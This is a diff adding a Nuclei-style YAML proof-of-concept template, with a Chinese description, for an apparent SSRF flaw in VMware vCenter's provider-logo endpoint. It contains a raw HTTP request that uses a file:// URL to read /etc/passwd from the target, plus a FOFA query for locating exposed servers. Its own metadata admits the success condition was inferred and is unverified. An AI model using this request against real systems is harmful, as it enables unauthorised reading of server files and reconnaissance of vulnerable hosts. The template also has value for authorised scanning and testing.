@@ -1,0 +1,47 @@
+id: poc-a882866ca2e025fff1b6
+info:
+  name: VMwarevCenterprovider-logo存在SSRF漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/a882866ca2e025fff1b6c26a4581c474
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: ssrf,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: a882866ca2e025fff1b6c26a4581c474
+    fofa: + fofa`title="ID_VC_Welcome"`
+http:
+- raw:
+  - 'GET /ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd HTTP/2.0
+
+    Host: {{Hostname}}
+
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    accept-language: zh-CN,zh;q=0.9
+
+    user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+
+    sec-fetch-user: ?1
+
+    sec-fetch-dest: document
+
+    sec-fetch-mode: navigate
+
+    accept-encoding: gzip, deflate, br, zstd
+
+    sec-ch-ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"
+
+    sec-ch-ua-mobile: ?0
+
+    sec-ch-ua-platform: "Windows"
+
+    sec-fetch-site: none
+
+    upgrade-insecure-requests: 1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
